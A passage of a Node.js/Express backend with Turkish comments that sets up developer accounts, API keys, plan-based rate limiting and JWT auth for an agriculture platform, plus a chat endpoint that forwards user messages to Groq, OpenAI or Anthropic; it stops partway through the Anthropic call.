async function initDevApiKeysTable() {
    try {
        // ── Eski tablo (geriye dönük uyumluluk) ──
        await dbRun(`
            CREATE TABLE IF NOT EXISTS dev_api_keys (
                id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "userId" UUID REFERENCES users(id) ON DELETE CASCADE,
                name TEXT NOT NULL,
                key TEXT UNIQUE NOT NULL,
                "isActive" BOOLEAN DEFAULT TRUE,
                "usageCount" INTEGER DEFAULT 0,
                "lastUsedAt" TIMESTAMPTZ,
                "createdAt" TIMESTAMPTZ DEFAULT NOW()
            )
        `);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_api_keys_key ON dev_api_keys(key)`);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_api_keys_user ON dev_api_keys("userId")`);

        // ══════════════════════════════════════════════════════════════════
        // 🆕 YENİ: Platformdan bağımsız geliştirici sistemi
        // ══════════════════════════════════════════════════════════════════

        // Geliştirici kullanıcıları — ana platform users tablosundan TAMAMEN bağımsız
        await dbRun(`
            CREATE TABLE IF NOT EXISTS dev_users (
                id          UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
                name        TEXT        NOT NULL,
                email       TEXT        UNIQUE NOT NULL,
                password    TEXT        NOT NULL,
                plan        TEXT        NOT NULL DEFAULT 'free',
                "isActive"  BOOLEAN     DEFAULT TRUE,
                "createdAt" TIMESTAMPTZ DEFAULT NOW(),
                "updatedAt" TIMESTAMPTZ DEFAULT NOW()
            )
        `);

        // Geliştirici API key'leri — dev_users'a bağlı (ana platform users'ına değil)
        await dbRun(`
            CREATE TABLE IF NOT EXISTS dev_keys (
                id            UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
                "devUserId"   UUID        NOT NULL REFERENCES dev_users(id) ON DELETE CASCADE,
                name          TEXT        NOT NULL DEFAULT 'API Key',
                key           TEXT        UNIQUE NOT NULL,
                "isActive"    BOOLEAN     DEFAULT TRUE,
                "usageCount"  INTEGER     DEFAULT 0,
                "lastUsedAt"  TIMESTAMPTZ,
                "createdAt"   TIMESTAMPTZ DEFAULT NOW()
            )
        `);

        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_keys_key    ON dev_keys(key)`);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_keys_user   ON dev_keys("devUserId")`);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_users_email ON dev_users(email)`);

        // ── Dakikalık rate limit takibi (cluster-safe, PostgreSQL tabanlı) ──
        await dbRun(`
            CREATE TABLE IF NOT EXISTS dev_rate_limit (
                id          UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
                "userId"    TEXT        NOT NULL,
                "minuteKey" TEXT        NOT NULL,
                count       INTEGER     DEFAULT 1,
                "createdAt" TIMESTAMPTZ DEFAULT NOW(),
                UNIQUE("userId", "minuteKey")
            )
        `);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_dev_rate_limit_user ON dev_rate_limit("userId", "minuteKey")`);
        // Eski kayıtları temizle (her gün otomatik çalışır)
        await dbRun(`DELETE FROM dev_rate_limit WHERE "createdAt" < NOW() - INTERVAL '2 hours'`).catch(() => {});

        console.log('✅ dev_api_keys + dev_users + dev_keys + dev_rate_limit tabloları hazır');
    } catch (e) {
        console.error('⚠️  dev tablo hatası:', e.message);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🔥 RATE LIMITING SİSTEMİ - Plan Bazlı
// ═══════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════
// 🔥 RATE LIMITING SİSTEMİ - Plan Bazlı (PostgreSQL tabanlı, cluster-safe)
// ═══════════════════════════════════════════════════════════════════════════

// Plan bazlı rate limit ayarları
const RATE_LIMITS = {
    free: { perMinute: 20,       perMonth: 1000,     maxKeys: 10,      name: 'Free' },
    dev:  { perMinute: 60,       perMonth: 10000,     maxKeys: 25,      name: 'Dev'  },
    pro:  { perMinute: Infinity, perMonth: Infinity,  maxKeys: Infinity, name: 'Pro'  },
};

// Rate limit kontrolü — PostgreSQL UPSERT ile cluster-safe
async function checkRateLimit(userId, plan = 'free') {
    const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;
    const now    = new Date();

    // ── Dakika limiti (Pro için atla) ────────────────────────────────────
    if (limits.perMinute !== Infinity) {
        // Dakika anahtarı: userId:YYYY-MM-DD-HH-MM
        const minuteKey = `${userId}:${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}-${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}`;

        // PostgreSQL UPSERT — atomik, tüm worker'larda paylaşımlı
        let currentCount = 1;
        try {
            const row = await dbGet(`
                INSERT INTO dev_rate_limit ("userId", "minuteKey", count)
                VALUES ($1, $2, 1)
                ON CONFLICT ("userId", "minuteKey")
                DO UPDATE SET count = dev_rate_limit.count + 1
                RETURNING count
            `, [String(userId), minuteKey]);
            currentCount = parseInt(row?.count || 1);
        } catch (e) {
            // Tablo yoksa (henüz oluşmadı) geç
            console.warn('[RateLimit] dev_rate_limit tablosu hazır değil:', e.message);
        }

        if (currentCount > limits.perMinute) {
            return {
                allowed  : false,
                reason   : 'minute_limit',
                limit    : limits.perMinute,
                current  : currentCount,
                retryAfter: 60 - now.getSeconds()
            };
        }
    }

    // ── Aylık limit (Pro için atla) ──────────────────────────────────────
    if (limits.perMonth !== Infinity) {
        let monthlyTotal = 0;
        try {
            const newUsage = await dbGet(
                `SELECT COALESCE(SUM("usageCount"),0) AS total FROM dev_keys
                 WHERE "devUserId" = $1 AND DATE_TRUNC('month',"lastUsedAt") = DATE_TRUNC('month',NOW())`,
                [userId]
            );
            monthlyTotal = parseInt(newUsage?.total || 0);
        } catch (_) {}
        if (monthlyTotal === 0) {
            try {
                const oldUsage = await dbGet(
                    `SELECT COALESCE(SUM("usageCount"),0) AS total FROM dev_api_keys
                     WHERE "userId" = $1 AND DATE_TRUNC('month',"lastUsedAt") = DATE_TRUNC('month',NOW())`,
                    [userId]
                );
                monthlyTotal = parseInt(oldUsage?.total || 0);
            } catch (_) {}
        }
        if (monthlyTotal >= limits.perMonth) {
            return {
                allowed: false,
                reason : 'monthly_limit',
                limit  : limits.perMonth,
                current: monthlyTotal
            };
        }
    }

    return {
        allowed: true,
        limits,
        plan
    };
}

// Eski rate limit kayıtlarını temizle (her 30 dakikada bir)
setInterval(async () => {
    try {
        await dbRun(`DELETE FROM dev_rate_limit WHERE "createdAt" < NOW() - INTERVAL '2 hours'`);
    } catch (_) {}
}, 30 * 60 * 1000);

// ── API Key doğrulama middleware ──────────────────────────────────────────
// Hem eski dev_api_keys (platform kullanıcıları) hem yeni dev_keys (dev_users) kontrol eder
async function authenticateApiKey(req, res, next) {
    const apiKey = req.headers['x-api-key'] || req.headers['x-api-key'.toLowerCase()];
    if (!apiKey) return res.status(401).json({ error: 'X-API-Key header eksik' });
    try {
        // Önce yeni dev_keys tablosunu dene (platformdan bağımsız)
        let keyRow = await dbGet(
            `SELECT dk.*, du.plan AS "userPlan", du.id AS "ownerId", du."isActive" AS "userActive"
             FROM dev_keys dk
             JOIN dev_users du ON dk."devUserId" = du.id
             WHERE dk.key = $1`,
            [apiKey]
        ).catch(() => null);

        let isNewSystem = true;

        // Bulunamazsa eski sistemi dene (geriye dönük uyumluluk)
        if (!keyRow) {
            isNewSystem = false;
            keyRow = await dbGet(
                `SELECT dak.*, u.id AS "ownerId", u.plan AS "userPlan"
                 FROM dev_api_keys dak
                 JOIN users u ON dak."userId" = u.id
                 WHERE dak.key = $1 AND dak."isActive" = TRUE`,
                [apiKey]
            ).catch(() => null);
        }

        if (!keyRow) return res.status(403).json({ error: 'Geçersiz veya devre dışı API anahtarı' });
        if (!keyRow.isActive) return res.status(403).json({ error: 'API anahtarı pasif durumda' });
        if (isNewSystem && !keyRow.userActive) return res.status(403).json({ error: 'Geliştirici hesabı devre dışı' });

        // Rate limit kontrolü
        const plan = keyRow.userPlan || 'free';
        const rateCheck = await checkRateLimit(keyRow.ownerId, plan);

        if (!rateCheck.allowed) {
            const retryAfter = rateCheck.retryAfter || 60;
            res.setHeader('Retry-After', retryAfter);
            res.setHeader('X-RateLimit-Limit', rateCheck.limit);
            res.setHeader('X-RateLimit-Remaining', 0);
            if (rateCheck.reason === 'minute_limit') {
                return res.status(429).json({ error: `Dakika limiti aşıldı (${rateCheck.limit} istek/dk)`, retryAfter, plan });
            } else {
                return res.status(429).json({ error: `Aylık limit aşıldı (${rateCheck.limit} istek/ay)`, plan });
            }
        }

        // Kullanım sayacını artır
        const table = isNewSystem ? 'dev_keys' : 'dev_api_keys';
        dbRun(`UPDATE ${table} SET "usageCount" = "usageCount" + 1, "lastUsedAt" = NOW() WHERE key = $1`, [apiKey]).catch(() => {});

        req.apiKey      = keyRow;
        req.apiKeyOwner  = keyRow.ownerId;
        req.userPlan    = plan;
        req.rateLimit   = rateCheck;
        res.setHeader('X-RateLimit-Plan',  plan);
        res.setHeader('X-RateLimit-Limit', rateCheck.limits?.perMinute === Infinity ? 'unlimited' : (rateCheck.limits?.perMinute || 'unknown'));
        next();
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
}

// ── Anahtar üretici ──────────────────────────────────────────────────────
function generateApiKey() {
    return 'agk_' + crypto.randomBytes(28).toString('hex');
}

// ══════════════════════════════════════════════════════════════════════════
// 🆕 YENİ: PLATFORMDAN BAĞIMSIZ GELİŞTİRİCİ AUTH
// ══════════════════════════════════════════════════════════════════════════

// ── Dev Token doğrulama middleware ───────────────────────────────────────
function authenticateDevToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Oturum açmanız gerekiyor' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
        if (!decoded.isDevUser) return res.status(401).json({ error: 'Geçersiz token türü' });
        req.devUser = decoded;
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Geçersiz veya süresi dolmuş token. Lütfen tekrar giriş yapın.' });
    }
}

// ── POST /api/dev/signup — Geliştirici Kaydı (OTP YOK, platform bağımsız) ─
// 🔒 Dev endpoint rate limitleri — daha önce sıfır koruma vardı
const devSignupLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 3,  message: { error: 'Saatte en fazla 3 geliştirici hesabı oluşturulabilir' } });
const devSigninLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, message: { error: 'Çok fazla giriş denemesi' } });

app.post('/api/dev/signup', devSignupLimiter, async (req, res) => {
    try {
        const { name, email, password } = req.body;
        if (!name || !email || !password)
            return res.status(400).json({ error: 'name, email ve password zorunludur' });
        if (password.length < 8)
            return res.status(400).json({ error: 'Şifre en az 8 karakter olmalı' });
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
            return res.status(400).json({ error: 'Geçerli bir e-posta adresi girin' });

        const cleanEmail = email.toLowerCase().trim();
        const existing   = await dbGet('SELECT id FROM dev_users WHERE email = $1', [cleanEmail]);
        if (existing)
            return res.status(400).json({ error: 'Bu e-posta adresi zaten kayıtlı' });

        const hashed = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const userId = uuidv4();

        await dbRun(
            `INSERT INTO dev_users (id, name, email, password, plan) VALUES ($1,$2,$3,$4,'free')`,
            [userId, name.trim(), cleanEmail, hashed]
        );

        const token = jwt.sign(
            { devUserId: userId, email: cleanEmail, name: name.trim(), plan: 'free', isDevUser: true },
            JWT_SECRET,
            { expiresIn: '30d', algorithm: 'HS256' }
        );

        res.status(201).json({
            message: 'Geliştirici hesabı oluşturuldu',
            token,
            user: { id: userId, name: name.trim(), email: cleanEmail, plan: 'free' }
        });
    } catch (e) {
        console.error('[DevSignup]', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── POST /api/dev/signin — Geliştirici Girişi ─────────────────────────────
app.post('/api/dev/signin', devSigninLimiter, async (req, res) => {
    try {
        const { email, password } = req.body;
        if (!email || !password)
            return res.status(400).json({ error: 'email ve password zorunludur' });

        const cleanEmail = email.toLowerCase().trim();
        const user = await dbGet('SELECT * FROM dev_users WHERE email = $1', [cleanEmail]);
        if (!user)
            return res.status(401).json({ error: 'E-posta veya şifre hatalı' });
        if (!user.isActive)
            return res.status(403).json({ error: 'Hesap devre dışı bırakılmış' });

        const match = await bcrypt.compare(password, user.password);
        if (!match)
            return res.status(401).json({ error: 'E-posta veya şifre hatalı' });

        const token = jwt.sign(
            { devUserId: user.id, email: user.email, name: user.name, plan: user.plan, isDevUser: true },
            JWT_SECRET,
            { expiresIn: '30d', algorithm: 'HS256' }
        );

        dbRun(`UPDATE dev_users SET "updatedAt" = NOW() WHERE id = $1`, [user.id]).catch(() => {});

        res.json({
            token,
            user: { id: user.id, name: user.name, email: user.email, plan: user.plan }
        });
    } catch (e) {
        console.error('[DevSignin]', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── GET /api/dev/me — Mevcut Geliştirici Bilgisi ──────────────────────────
app.get('/api/dev/me', authenticateDevToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT id, name, email, plan, "createdAt" FROM dev_users WHERE id = $1`,
            [req.devUser.devUserId]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        res.json({ user });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── GET /api/dev/keys — Key Listesi ──────────────────────────────────────
app.get('/api/dev/keys', authenticateDevToken, async (req, res) => {
    try {
        const keys = await dbAll(
            `SELECT id, name, key, "isActive", "usageCount", "lastUsedAt", "createdAt"
             FROM dev_keys WHERE "devUserId" = $1 ORDER BY "createdAt" DESC`,
            [req.devUser.devUserId]
        );
        res.json({ keys: keys || [] });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── POST /api/dev/keys — Yeni Key Oluştur ────────────────────────────────
app.post('/api/dev/keys', authenticateDevToken, async (req, res) => {
    try {
        const plan   = req.devUser.plan || 'free';
        const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;

        const countRow = await dbGet(
            `SELECT COUNT(*) AS c FROM dev_keys WHERE "devUserId" = $1`,
            [req.devUser.devUserId]
        );
        const count = parseInt(countRow?.c || 0);
        if (limits.maxKeys !== Infinity && count >= limits.maxKeys)
            return res.status(400).json({
                error: `${limits.name} planında en fazla ${limits.maxKeys} key oluşturabilirsiniz`,
                plan, maxKeys: limits.maxKeys, currentKeys: count
            });

        const keyName = ((req.body?.name || '').trim().slice(0, 80)) || 'API Key';
        const newKey  = generateApiKey();
        const keyId   = uuidv4();

        await dbRun(
            `INSERT INTO dev_keys (id, "devUserId", name, key) VALUES ($1,$2,$3,$4)`,
            [keyId, req.devUser.devUserId, keyName, newKey]
        );

        res.status(201).json({
            message: 'API anahtarı oluşturuldu',
            key: newKey,   // Sadece bir kez gösterilir
            id: keyId,
            name: keyName,
            isActive: true,
            usageCount: 0,
            createdAt: new Date().toISOString(),
            warning: 'Bu anahtarı şimdi kopyalayın, bir daha tam olarak gösterilmeyecek!'
        });
    } catch (e) {
        console.error('[DevCreateKey]', e);
        if (e.code === '23505') return res.status(409).json({ error: 'Çakışma, tekrar deneyin' });
        res.status(500).json({ error: 'Key oluşturulamadı' });
    }
});

// ── DELETE /api/dev/keys/:id — Key Sil ───────────────────────────────────
app.delete('/api/dev/keys/:id', authenticateDevToken, async (req, res) => {
    try {
        const result = await dbGet(
            `DELETE FROM dev_keys WHERE id = $1 AND "devUserId" = $2 RETURNING id`,
            [req.params.id, req.devUser.devUserId]
        );
        if (!result) return res.status(404).json({ error: 'Anahtar bulunamadı' });
        res.json({ message: 'Anahtar silindi', id: req.params.id });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── PATCH /api/dev/keys/:id — Aktif/Pasif ────────────────────────────────
app.patch('/api/dev/keys/:id', authenticateDevToken, async (req, res) => {
    const { isActive } = req.body;
    if (typeof isActive !== 'boolean')
        return res.status(400).json({ error: 'isActive boolean olmalı (true/false)' });
    try {
        const result = await dbGet(
            `UPDATE dev_keys SET "isActive" = $1 WHERE id = $2 AND "devUserId" = $3 RETURNING id, "isActive"`,
            [isActive, req.params.id, req.devUser.devUserId]
        );
        if (!result) return res.status(404).json({ error: 'Anahtar bulunamadı' });
        res.json({ message: `Anahtar ${isActive ? 'aktif' : 'pasif'} edildi`, ...result });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── GET /api/dev/limits — Kullanım Limitleri ──────────────────────────────
app.get('/api/dev/limits', authenticateDevToken, async (req, res) => {
    try {
        const plan   = req.devUser.plan || 'free';
        const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;

        const usageRow = await dbGet(
            `SELECT COALESCE(SUM("usageCount"),0) AS total FROM dev_keys WHERE "devUserId" = $1`,
            [req.devUser.devUserId]
        );
        const keyCount = await dbGet(
            `SELECT COUNT(*) AS count FROM dev_keys WHERE "devUserId" = $1`,
            [req.devUser.devUserId]
        );

        res.json({
            plan,
            limits: {
                perMinute: limits.perMinute === Infinity ? null : limits.perMinute,
                perMonth : limits.perMonth  === Infinity ? null : limits.perMonth,
                maxKeys  : limits.maxKeys   === Infinity ? null : limits.maxKeys,
                name     : limits.name
            },
            usage: {
                monthly: parseInt(usageRow?.total || 0),
                keys   : parseInt(keyCount?.count || 0)
            }
        });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── GET /api/dev/status — Durum (Public) ─────────────────────────────────
app.get('/api/dev/status', (req, res) => {
    res.json({
        status   : 'online',
        version  : '2.0.0',
        uptime   : process.uptime(),
        timestamp: new Date().toISOString(),
        plans    : Object.fromEntries(
            Object.entries(RATE_LIMITS).map(([k, v]) => [k, {
                ...v,
                perMinute: v.perMinute === Infinity ? 'unlimited' : v.perMinute,
                perMonth : v.perMonth  === Infinity ? 'unlimited' : v.perMonth,
                maxKeys  : v.maxKeys   === Infinity ? 'unlimited' : v.maxKeys,
            }])
        )
    });
});

// ── 1. ANAHTARLARI LİSTELE ────────────────────────────────────────────────
// GET /api/dev/apikeys
app.get('/api/dev/apikeys', authenticateToken, async (req, res) => {
    try {
        const keys = await dbAll(
            `SELECT id, name, "isActive", "usageCount", "lastUsedAt", "createdAt",
                    CONCAT(LEFT(key, 20), '...') AS "keyPreview"
             FROM dev_api_keys
             WHERE "userId" = $1
             ORDER BY "createdAt" DESC`,
            [req.user.id]
        );
        res.json({ keys });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ── Kullanıcı Limitleri Endpoint ──────────────────────────────────────────
// GET /api/dev/limits
app.get('/api/dev/limits', authenticateToken, async (req, res) => {
    try {
        const plan = req.user.plan || 'free';
        const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;
        
        // Mevcut kullanımı al
        const usage = await dbGet(
            `SELECT COALESCE(SUM("usageCount"), 0) AS total FROM dev_api_keys 
             WHERE "userId" = $1 AND DATE_TRUNC('month', "lastUsedAt") = DATE_TRUNC('month', NOW())`,
            [req.user.id]
        );
        
        const keyCount = await dbGet(
            `SELECT COUNT(*) as count FROM dev_api_keys WHERE "userId" = $1`,
            [req.user.id]
        );
        
        res.json({
            plan,
            limits,
            usage: {
                monthly: parseInt(usage?.total || 0),
                keys: parseInt(keyCount?.count || 0)
            }
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── 2. ANAHTAR OLUŞTUR ────────────────────────────────────────────────────
// POST /api/dev/apikeys
const devKeyCreateLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 10, message: { error: 'Çok fazla anahtar isteği' } });
app.post('/api/dev/apikeys', authenticateToken, devKeyCreateLimiter, async (req, res) => {
    const { name } = req.body;
    if (!name || name.trim().length < 1) return res.status(400).json({ error: 'Anahtar adı gerekli' });
    if (name.length > 80) return res.status(400).json({ error: 'Anahtar adı en fazla 80 karakter' });

    try {
        // Kullanıcının planını al
        const user = await dbGet(`SELECT plan FROM users WHERE id = $1`, [req.user.id]);
        const plan = user?.plan || 'free';
        const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;
        
        // Plan limiti kontrolü
        const countRow = await dbGet(
            `SELECT COUNT(*) AS c FROM dev_api_keys WHERE "userId" = $1`,
            [req.user.id]
        );
        
        if (limits.maxKeys !== Infinity && parseInt(countRow?.c || 0) >= limits.maxKeys) {
            return res.status(429).json({ 
                error: `${limits.name} plan ile en fazla ${limits.maxKeys} anahtar oluşturabilirsiniz`,
                plan,
                maxKeys: limits.maxKeys,
                currentKeys: parseInt(countRow?.c || 0),
                upgradeUrl: '/agro-dev.html#plans'
            });
        }

        const fullKey = generateApiKey();
        const result = await dbGet(
            `INSERT INTO dev_api_keys ("userId", name, key)
             VALUES ($1, $2, $3)
             RETURNING id, name, "isActive", "usageCount", "createdAt"`,
            [req.user.id, name.trim(), fullKey]
        );

        // Tam anahtarı sadece oluşturma anında gönder
        res.status(201).json({
            message: 'API anahtarı oluşturuldu',
            key: fullKey,   // Sadece bir kez!
            id: result.id,
            name: result.name,
            isActive: result.isActive,
            usageCount: 0,
            createdAt: result.createdAt,
            warning: 'Bu anahtarı şimdi kopyalayın, bir daha gösterilmeyecek!'
        });
    } catch (e) {
        console.error(e);
        if (e.code === '23505') return res.status(409).json({ error: 'Çakışma, tekrar deneyin' });
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ── 3. ANAHTAR SİL ───────────────────────────────────────────────────────
// DELETE /api/dev/apikeys/:id
app.delete('/api/dev/apikeys/:id', authenticateToken, async (req, res) => {
    try {
        const result = await dbGet(
            `DELETE FROM dev_api_keys WHERE id = $1 AND "userId" = $2 RETURNING id`,
            [req.params.id, req.user.id]
        );
        if (!result) return res.status(404).json({ error: 'Anahtar bulunamadı' });
        res.json({ message: 'Anahtar silindi', id: req.params.id });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ── 4. ANAHTAR DURUM GÜNCELLE ─────────────────────────────────────────────
// PATCH /api/dev/apikeys/:id
app.patch('/api/dev/apikeys/:id', authenticateToken, async (req, res) => {
    const { isActive } = req.body;
    if (typeof isActive === 'undefined') return res.status(400).json({ error: 'isActive alanı gerekli' });
    try {
        const result = await dbGet(
            `UPDATE dev_api_keys SET "isActive" = $1 WHERE id = $2 AND "userId" = $3 RETURNING id, "isActive"`,
            [!!isActive, req.params.id, req.user.id]
        );
        if (!result) return res.status(404).json({ error: 'Anahtar bulunamadı' });
        res.json({ message: `Anahtar ${isActive ? 'aktif' : 'pasif'} edildi`, ...result });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ── 5. AI CHAT ENDPOINT (API Key ile) ────────────────────────────────────
// POST /api/ai/chat
const aiChatLimiter = rateLimit({ windowMs: 60 * 1000, max: 30, message: { error: 'Dakika limiti aşıldı (max 30 istek/dk)' } });
app.post('/api/ai/chat', aiChatLimiter, authenticateApiKey, async (req, res) => {
    const { message, context, lang } = req.body;
    if (!message || message.trim().length === 0) return res.status(400).json({ error: 'message alanı gerekli' });
    if (message.length > 2048) return res.status(400).json({ error: 'Mesaj en fazla 2048 karakter olabilir' });

    try {
        // Aylık kullanım kontrolü — yeni dev_keys ve eski dev_api_keys tablolarını kontrol eder
        const ownerId = req.apiKey.devUserId || req.apiKey.userId || req.apiKeyOwner;
        let monthlyUsage = 0;
        try {
            const newUsage = await dbGet(
                `SELECT COALESCE(SUM("usageCount"), 0) AS total FROM dev_keys WHERE "devUserId" = $1`,
                [ownerId]
            );
            monthlyUsage = parseInt(newUsage?.total || 0);
        } catch (_) {}
        if (monthlyUsage === 0) {
            try {
                const oldUsage = await dbGet(
                    `SELECT COALESCE(SUM("usageCount"), 0) AS total FROM dev_api_keys WHERE "userId" = $1`,
                    [ownerId]
                );
                monthlyUsage = parseInt(oldUsage?.total || 0);
            } catch (_) {}
        }

        const plan   = req.userPlan || 'free';
        const limits = RATE_LIMITS[plan] || RATE_LIMITS.free;
        if (limits.perMonth !== Infinity && monthlyUsage >= limits.perMonth) {
            return res.status(429).json({
                error: `Aylık istek limiti aşıldı (${limits.perMonth}/ay)`,
                usage: monthlyUsage,
                limit: limits.perMonth
            });
        }

        // Burada gerçek AI modeline istek atılacak
        // Şu an için placeholder — gerçek model entegrasyonu yapılabilir
        const systemPrompt = `Sen Agrolink tarım yapay zekasısın. Türkiye tarımı konusunda uzman bir asistansın. 
        Çiftçilere bitki hastalıkları, sulama, gübreleme, hasat, hava durumu ve tarımsal teknikler hakkında 
        ${lang === 'en' ? 'English' : 'Türkçe'} yanıt veriyorsun. Kısa, pratik ve uygulanabilir öneriler sun.`;

        // AI yanıt oluşturma (örnek/stub - gerçek AI bağlantısı buraya)
        const aiResponse = await generateAiResponse(message, systemPrompt, lang);
        
        res.json({
            reply: aiResponse,
            model: 'agrolink-ai-v1',
            usage: { tokens: Math.floor(message.length / 3 + aiResponse.length / 3) },
            monthlyUsage: monthlyUsage + 1,
            plan,
            limits: {
                perMinute: limits.perMinute === Infinity ? 'unlimited' : limits.perMinute,
                perMonth : limits.perMonth  === Infinity ? 'unlimited' : limits.perMonth
            }
        });
    } catch (e) {
        console.error('AI chat error:', e);
        const isConfig = e.message?.includes('yapılandırılmamış');
        res.status(isConfig ? 503 : 500).json({
            error: isConfig
                ? 'AI sağlayıcısı yapılandırılmamış. Sunucu .env dosyasına GROQ_API_KEY, OPENAI_API_KEY veya ANTHROPIC_API_KEY ekleyin.'
                : 'AI yanıtı alınamadı: ' + (e.message || 'Bilinmeyen hata'),
            hint: isConfig ? 'En kolay seçenek: Groq (ücretsiz) → https://console.groq.com' : undefined
        });
    }
});

// ── AI yanıt üretici — Gerçek model entegrasyonu ─────────────────────────
// Öncelik sırası:
//   1. GROQ_API_KEY      → Groq (llama-3.3-70b-versatile, ücretsiz & hızlı)
//   2. OPENAI_API_KEY    → OpenAI GPT-4o-mini
//   3. ANTHROPIC_API_KEY → Claude claude-haiku-4-5-20251001
//   4. LLAMA_CPP_URL     → Sunucudaki yerel llama.cpp (zaten kurulu)
//
// .env dosyasına eklenecek örnek:
//   GROQ_API_KEY=gsk_xxxx
//   OPENAI_API_KEY=sk-xxxx
//   ANTHROPIC_API_KEY=sk-ant-xxxx

async function generateAiResponse(message, systemPrompt, lang) {
    const { default: fetch } = await import('node-fetch');

    // ── 1. GROQ (en hızlı, ücretsiz tier var) ───────────────────────────
    if (process.env.GROQ_API_KEY) {
        try {
            const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                method : 'POST',
                headers: {
                    'Content-Type' : 'application/json',
                    'Authorization': `Bearer ${process.env.GROQ_API_KEY}`
                },
                body: JSON.stringify({
                    model      : process.env.GROQ_MODEL || 'llama-3.3-70b-versatile',
                    max_tokens : parseInt(process.env.AI_MAX_TOKENS) || 1024,
                    temperature: parseFloat(process.env.AI_TEMPERATURE) || 0.7,
                    messages   : [
                        { role: 'system', content: systemPrompt },
                        { role: 'user',   content: message }
                    ]
                }),
                signal: AbortSignal.timeout(parseInt(process.env.AI_TIMEOUT_MS) || 30000)
            });
            if (!res.ok) {
                const err = await res.text().catch(() => '');
                throw new Error(`Groq HTTP ${res.status}: ${err.slice(0, 200)}`);
            }
            const data = await res.json();
            const reply = data?.choices?.[0]?.message?.content;
            if (!reply) throw new Error('Groq boş yanıt döndürdü');
            console.log(`[AI] Groq yanıtı alındı (${reply.length} karakter)`);
            return reply.trim();
        } catch (e) {
            console.error('[AI] Groq hatası, sonraki sağlayıcıya geçiliyor:', e.message);
        }
    }

    // ── 2. OPENAI ────────────────────────────────────────────────────────
    if (process.env.OPENAI_API_KEY) {
        try {
            const res = await fetch('https://api.openai.com/v1/chat/completions', {
                method : 'POST',
                headers: {
                    'Content-Type' : 'application/json',
                    'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`
                },
                body: JSON.stringify({
                    model      : process.env.OPENAI_MODEL || 'gpt-4o-mini',
                    max_tokens : parseInt(process.env.AI_MAX_TOKENS) || 1024,
                    temperature: parseFloat(process.env.AI_TEMPERATURE) || 0.7,
                    messages   : [
                        { role: 'system', content: systemPrompt },
                        { role: 'user',   content: message }
                    ]
                }),
                signal: AbortSignal.timeout(parseInt(process.env.AI_TIMEOUT_MS) || 30000)
            });
            if (!res.ok) {
                const err = await res.text().catch(() => '');
                throw new Error(`OpenAI HTTP ${res.status}: ${err.slice(0, 200)}`);
            }
            const data = await res.json();
            const reply = data?.choices?.[0]?.message?.content;
            if (!reply) throw new Error('OpenAI boş yanıt döndürdü');
            console.log(`[AI] OpenAI yanıtı alındı (${reply.length} karakter)`);
            return reply.trim();
        } catch (e) {
            console.error('[AI] OpenAI hatası, sonraki sağlayıcıya geçiliyor:', e.message);
        }
    }

    // ── 3. ANTHROPIC ─────────────────────────────────────────────────────
    if (process.env.ANTHROPIC_API_KEY) {
        try {
            const res = await fetch('https://api.anthropic.com/v1/messages', {
                method : 'POST',
                headers: {
                    'Content-Type'      : 'application/json',
                    'x-api-key'         : process.env.ANTHROPIC_API_KEY,
                    'anthropic-version' : '2023-06-01'
                },
                body: JSON.stringify({
                    model      : process.env.ANTHROPIC_MODEL || 'claude-haiku-4-5-20251001',
                    max_tokens : parseInt(process.env.AI_MAX_TOKENS) || 1024,
                    system     : systemPrompt,
                    messages   : [{ role: 'user', content: message }]
                }),
                signal: AbortSignal.timeout(parseInt(process.env.AI_TIMEOUT_MS) || 30000)
            });
            if (!res.ok) {
                const err = await res.text().catch(() => '');
                throw new Error(`Anthropic HTTP ${res.status}: ${err.slice(0, 200)}`);
            }
            const data = await res.json();
